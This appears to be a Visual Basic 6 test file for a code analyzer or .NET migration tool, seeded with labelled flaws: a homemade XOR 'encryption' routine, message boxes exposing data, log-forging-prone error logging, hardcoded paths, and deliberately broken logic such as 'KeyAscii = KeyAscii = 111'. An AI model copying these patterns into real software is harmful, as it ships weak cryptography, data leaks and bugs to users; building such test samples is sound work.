ret& = CreateProcessA(0&, cmdline$, 0&, 0&, 1&, NORMAL_PRIORITY_CLASS, 0&, 0&, start, proc)

'Wait for the shelled application to finish:
ret& = WaitForSingleObject(proc.hProcess, INFINITE)
ret& = CloseHandle(proc.hProcess)
'EXPOSING OF SENSITIVE DATA
MsgBox obj   'Relying on default property
MsgBox Text1   'Relying on default property
'FIXIT: Return has new meaning in Visual Basic .NET                                        FixIT90210ae-R9642-H1984
Return 'DEPRECATED
End Sub

Private Sub Form_Terminate()
' MISSED ON ERROR RESUME NEXT
    MsgBox "The form was terminated"
End Sub
Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)

    ' Only prompt if the user hits X
    If UnloadMode = 0 Then
        If MsgBox("Are you sure you want to quit?", vbYesNo Or vbQuestion) = vbNo Then Cancel = 0  'Likewise, use True and False instead of -1 and 0
    End If

End Sub
Private Sub Form_Resize()
' MISSED ON ERROR RESUME NEXT
   Text1.Move 0, 0, ScaleWidth, ScaleHeight
End Sub


Public Property Get lpData() As Long
'FIXIT: Keyword 'VarPtr' not supported in Visual Basic .NET                                FixIT90210ae-R6614-H1984
   lpData = VarPtr(m_waveFmt) 'VarPtr DEPRECATED
End Property

Public Property Let lpData(pointer As Long)
'To get the address of the first character of a String, pass 'the String variable to the StrPtr function.
Dim lngCharAddress As Long 'VARIABLE INIALIZED BUT NEVER USED
Dim strMyVariable As String
strMyVariable = "Some String"
'FIXIT: Keyword 'StrPtr' not supported in Visual Basic .NET                                FixIT90210ae-R6614-H1984
lngCharAddress = StrPtr(strMyVariable) 'StrPtr DEPRECATED
   CopyMemory m_waveFmt, ByVal pointer, Len(m_waveFmt)
End Property

Public Function IsWinNT() As Boolean

  'Returns True if the current operating system is WinNT
   Dim osvi As OSVERSIONINFO
   osvi.dwOSVersionInfoSize = Len(osvi)
   GetVersionEx osvi
   IsWinNT = (osvi.dwPlatformId = VER_PLATFORM_WIN32_NT)
   
End Function


Public Function CheckString(msg As String) As String

   If bIsWinNT Then 'VARIABLE NOT INIALIZED
      CheckString = StrConv(msg, vbUnicode)
   Else
      CheckString = msg
   End If
   
End Function


Public Function GetStrFromPtr(lpszStr As Long, nBytes As Integer) As String

  'Returns string before first null char
  'encountered (if any) from a string pointer.
  'lpszStr = memory address of first byte in string
  'nBytes = number of bytes to copy.
  'StrConv used for both ANSII and Unicode strings BE CAREFUL!
   ReDim ab(nBytes) As Byte   'zero-based (nBytes + 1 elements)
   CopyMemory ab(0), ByVal lpszStr, nBytes
   GetStrFromPtr = GetStrFromBuffer(StrConv(ab(), vbUnicode))
  
End Function


Public Function GetStrFromBuffer(szStr As String) As String

  'Returns string before first null char encountered (if any)
  'from either an ANSII or Unicode string buffer.
   If IsUnicodeStr(szStr) Then szStr = StrConv(szStr, vbFromUnicode)
   
   If InStr(szStr, vbNullChar) Then
      GetStrFromBuffer = Left$(szStr, InStr(szStr, vbNullChar) - 1)
   Else
      GetStrFromBuffer = szStr
   End If

End Function


Public Function IsUnicodeStr(sBuffer As String) As Boolean

  'Returns True if sBuffer evaluates to a Unicode string
   Dim dwRtnFlags As Long
   dwRtnFlags = IS_TEXT_UNICODE_UNICODE_MASK
   IsUnicodeStr = IsTextUnicode(ByVal sBuffer, Len(sBuffer), dwRtnFlags)

End Function

Private Sub ADAMTCP1_StreamDataArrival(ByVal iMatchIndex As Long, ByVal lpszFromIP As String)
Dim A$, B$, c$, d$, E$, F$, G$
'FIXIT: Declare 'StreamData' with an early-bound data type                                 FixIT90210ae-R1672-R1B8ZE
Dim StreamData, ADAMTCP1 As TypeOfStreamData
Dim rwa As RectWordArray

Dim AlarmInfo As TypeOfSubAlarmInfo
Dim alarmArray As TypeOfAlarmArray


If (iRecCount Mod 3) = 2 Then
txtMsg.Text = ""
End If
iRecCount = iRecCount + 1

'--- reading alarm information ---
'FIXIT: The LSet function can only be used with strings in Visual Basic .NET.              FixIT90210ae-R9228-R1B8ZE
LSet alarmArray = AlarmInfo

'FIXIT: The LSet function can only be used with strings in Visual Basic .NET.              FixIT90210ae-R9228-R1B8ZE
LSet AlarmInfo = alarmArray 'LSET DEPRECATED

A$ = "MatchIndex:" + " IP:" + lpszFromIP + vbCrLf
'FIXIT: Replace 'Hex' function with 'Hex$' function                                        FixIT90210ae-R9757-R1B8ZE
'FIXIT: Replace 'Hex' function with 'Hex$' function                                        FixIT90210ae-R9757-R1B8ZE
'FIXIT: Replace 'Hex' function with 'Hex$' function                                        FixIT90210ae-R9757-R1B8ZE
B$ = "DI/DO Data:" + vbCrLf + Hex(StreamData.DIO(0)) + ":" + Hex(StreamData.DIO(1)) + ":" + Hex(StreamData.DIO(2)) + vbCrLf
'FIXIT: Replace 'Hex' function with 'Hex$' function                                        FixIT90210ae-R9757-R1B8ZE
'FIXIT: Replace 'Hex' function with 'Hex$' function                                        FixIT90210ae-R9757-R1B8ZE
'FIXIT: Replace 'Hex' function with 'Hex$' function                                        FixIT90210ae-R9757-R1B8ZE
c$ = "AI/AO Data of Slot0:" + vbCrLf + Hex(StreamData.Slot0(0)) + ":" + Hex(StreamData.Slot0(1)) + ":" + Hex(StreamData.Slot0(2)) + vbCrLf
'FIXIT: Replace 'Hex' function with 'Hex$' function                                        FixIT90210ae-R9757-R1B8ZE
'FIXIT: Replace 'Hex' function with 'Hex$' function                                        FixIT90210ae-R9757-R1B8ZE
'FIXIT: Replace 'Hex' function with 'Hex$' function                                        FixIT90210ae-R9757-R1B8ZE
d$ = "AI/AO Data of Slot7:" + vbCrLf + Hex(StreamData.Slot7(0)) + ":" + Hex(StreamData.Slot7(1)) + ":" + Hex(StreamData.Slot7(2)) + vbCrLf
E$ = "an alarm change at:" + vbCrLf
F$ = "Alarm Type:" + "Hi-Alarm" + " Alarm status:" + "On" + vbCrLf
G$ = "IP:" + " Slot:" + " Channel:" + vbCrLf
txtMsg.Text = txtMsg.Text + A$ + B$ + c$ + d$ + E$ + F$ + G$ + vbCrLf

End Sub
' Visual Basic 6.0
Private Sub Form_Paint()
        
    Dim PixelColor As Long
    Dim linea As Line
    Randomize Timer1
Set linea = Form.Controls.Add("Vb.Line", "linea")
With linea
'FIXIT: There is no Line control in Visual Basic .NET. Horizontal and vertical Line controls are converted to Visual Basic .NET Label controls. Diagonal lines are not upgraded to Visual Basic .NET. Use GDI+ to create lines in Visual Basic .NET Windows forms.     FixIT90210ae-R149-R57265
    .X1 = 100
'FIXIT: There is no Line control in Visual Basic .NET. Horizontal and vertical Line controls are converted to Visual Basic .NET Label controls. Diagonal lines are not upgraded to Visual Basic .NET. Use GDI+ to create lines in Visual Basic .NET Windows forms.     FixIT90210ae-R149-R57265
    .Y2 = 200
'FIXIT: There is no Line control in Visual Basic .NET. Horizontal and vertical Line controls are converted to Visual Basic .NET Label controls. Diagonal lines are not upgraded to Visual Basic .NET. Use GDI+ to create lines in Visual Basic .NET Windows forms.     FixIT90210ae-R149-R57265
    .X2 = 2000
'FIXIT: There is no Line control in Visual Basic .NET. Horizontal and vertical Line controls are converted to Visual Basic .NET Label controls. Diagonal lines are not upgraded to Visual Basic .NET. Use GDI+ to create lines in Visual Basic .NET Windows forms.     FixIT90210ae-R149-R57265
    .Y2 = 200
'FIXIT: There is no Line control in Visual Basic .NET. Horizontal and vertical Line controls are converted to Visual Basic .NET Label controls. Diagonal lines are not upgraded to Visual Basic .NET. Use GDI+ to create lines in Visual Basic .NET Windows forms.     FixIT90210ae-R149-R57265
    .BorderColor = 0
'FIXIT: There is no Line control in Visual Basic .NET. Horizontal and vertical Line controls are converted to Visual Basic .NET Label controls. Diagonal lines are not upgraded to Visual Basic .NET. Use GDI+ to create lines in Visual Basic .NET Windows forms.     FixIT90210ae-R149-R57265
    .Visible = True
    .ZOrder (0)
End With
    Picture1.Picture = LoadPicture("C:\Windows\Greenstone.bmp") 'HARDCODED ABSOLUTE PATH
    PixelColor = Picture1.Point(10, 10) 'DEPRECATED:Point
    ' Draw a solid red rectangle.
'FIXIT: FillColor property has no Visual Basic .NET equivalent and will not be upgraded.     FixIT90210ae-R7594-R67265
    FillColor = vbRed
'FIXIT: FillStyle property has no Visual Basic .NET equivalent and will not be upgraded.     FixIT90210ae-R7594-R67265
    FillStyle = vbSolid
    Picture1.Line (10, 10)-(1000, 500), vbRed, B
    ' Draw a rectangle filled with a crosshatch pattern.
'FIXIT: FillColor property has no Visual Basic .NET equivalent and will not be upgraded.     FixIT90210ae-R7594-R67265
    FillColor = vbBlack
'FIXIT: FillStyle property has no Visual Basic .NET equivalent and will not be upgraded.     FixIT90210ae-R7594-R67265
    FillStyle = vbCross
    Picture1.Line (10, 500)-(1000, 1000), vbBlack, B  'DEPRECATED:Line
'FIXIT: DrawWidth property has no Visual Basic .NET equivalent and will not be upgraded.     FixIT90210ae-R7594-R67265
        DrawWidth = 1
    Picture1.PSet (1000, 1000), vbRed 'DEPRECATED:Pset
    ' Draw a solid black line 200 twips from the top of the form.
        ' Draw a 1000 twip diameter red circle
    Picture1.Circle (500, 500), 500, vbRed 'DEPRECATED:Circle
        Timer1.Interval = 0 'DEPRECATED: do not set Interval to 0
End Sub


' WEAK CRYPTOGRAPHY
Public Function EncryptString(theString As String, TheKey As String) As String
    Dim x As Long
    Dim eKey As Byte, eChr As Byte, oChr As Byte, tmp$
    For i = 1 To Len(TheKey)
         'generate a key
          eKey = Asc(Mid$(TheKey, i, 1)) Xor eKey
    Next

    'reset random function
    Rnd -1
    'initilize our key as the random seed
    Randomize eKey
    'generate a pseudo old char
    oChr = Int(Rnd * 256)
    'start encryption
    For x = 1 To Len(theString)
        pp = pp + 1
        If pp > Len(TheKey) Then pp = 1
        eChr = Asc(Mid$(theString, x, 1)) Xor _
                   Int(Rnd * 256) Xor Asc(Mid$(TheKey, pp, 1)) Xor oChr
        tmp$ = tmp$ & Chr(eChr)
        oChr = eChr
    Next
    EncryptString = AsctoHex(tmp$)

End Function

Private Function ASCIItoUTF(d As String) As String
Dim c As Long

c = Asc(d)
If (c < &H80) Then
ASCIItoUTF = Chr(c)
ElseIf (c < &H800) Then
ASCIItoUTF = Chr(&HC0 Or (c / (2 ^ 6)))
ASCIItoUTF = ASCIItoUTF + Chr(&H80 Or (c And &H3F))
End If
End Function
Function HexToAsc(ByVal hstr As String) As String
Dim x As Long
Dim nstr As String
For x = 1 To Len(hstr) Step 2
nstr = nstr & Chr(Val("&H" & Mid$(hstr, x, 2)))
Next
HexToAsc = nstrE
End Function


Private Sub Form_KeyPress(KeyAscii As Integer)
If KeyAscii = KeyAscii = 111 Then
If KeyAscii = KeyAscii = 100 Then
MsgBox "Secret Area loading. . ."
End If
End If
End Sub
Public Function DecryptString(theString As String, TheKey As String) As String

Dim x As Long
Dim eKey As Byte, eChr As Byte, oChr As Byte, tmp$
For i = 1 To Len(TheKey)
     'generate a key
     eKey = Asc(Mid$(TheKey, i, 1)) Xor eKey
Next
'reset random function
Rnd -1
'initilize our key as the random seed
Randomize eKey
'generate a pseudo old char
oChr = Int(Rnd * 256)
'start decryption
tmp$ = HexToAsc(theString)
    DecryptString = ""
    For x = 1 To Len(tmp$)
    pp = pp + 1
    If pp > Len(TheKey) Then pp = 1
    If x > 1 Then oChr = Asc(Mid$(tmp$, x - 1, 1))
    eChr = Asc(Mid$(tmp$, x, 1)) Xor Int(Rnd * 256) Xor _
           Asc(Mid$(TheKey, pp, 1)) Xor oChr
        DecryptString = DecryptString & Chr$(eChr)
Next

End Function

'FIXIT: Declare 'AsctoHex' with an early-bound data type                                   FixIT90210ae-R1672-R1B8ZE
Private Function AsctoHex(ByVal astr As String)

    For x = 1 To Len(astr)
        hc = Hex$(Asc(Mid$(astr, x, 1)))
'FIXIT: Replace 'String' function with 'String$' function                                  FixIT90210ae-R9757-R1B8ZE
        nstr = nstr & String(2 - Len(hc), "0") & hc
    Next
    AsctoHex = nstr

End Function

'LOG FORGING
Sub MySub()
  On Error GoTo ErrHandler
  '... Do something ...'
  On Error GoTo 0 'DEPRECATED
  Exit Sub

ErrHandler:
  Call LogError("MySub", Err, Error$) ' passes name of current routine '
End Sub

' General routine for logging errors '
Sub LogError(ProcName$, ErrNum&, ErrorMsg$)
  On Error GoTo ErrHandler
  Dim nUnit As Integer
  nUnit = FreeFile
  ' This assumes write access to the directory containing the program '
  ' You will need to choose another directory if this is not possible '
  Open App.Path & App.EXEName & ".log" For Append As nUnit
'FIXIT: Print method has no Visual Basic .NET equivalent and will not be upgraded.         FixIT90210ae-R7594-R67265
  Print #nUnit, "Error in " & ProcName
'FIXIT: Print method has no Visual Basic .NET equivalent and will not be upgraded.         FixIT90210ae-R7594-R67265
  Print #nUnit, "  " & ErrNum & ", " & ErrorMsg
'FIXIT: Print method has no Visual Basic .NET equivalent and will not be upgraded.         FixIT90210ae-R7594-R67265
  Print #nUnit, "  " & Format$(Now)
'FIXIT: Print method has no Visual Basic .NET equivalent and will not be upgraded.         FixIT90210ae-R7594-R67265
  Print #nUnit, " "
  Close nUnit
  Exit Sub
ErrHandler:
  'Failed to write log for some reason.'
  'Show MsgBox so error does not go unreported '
  MsgBox "Error in " & ProcName & vbNewLine & _
    ErrNum & ", " & ErrorMsg  'EXPOSING OF SENSITIVE DATA
End Sub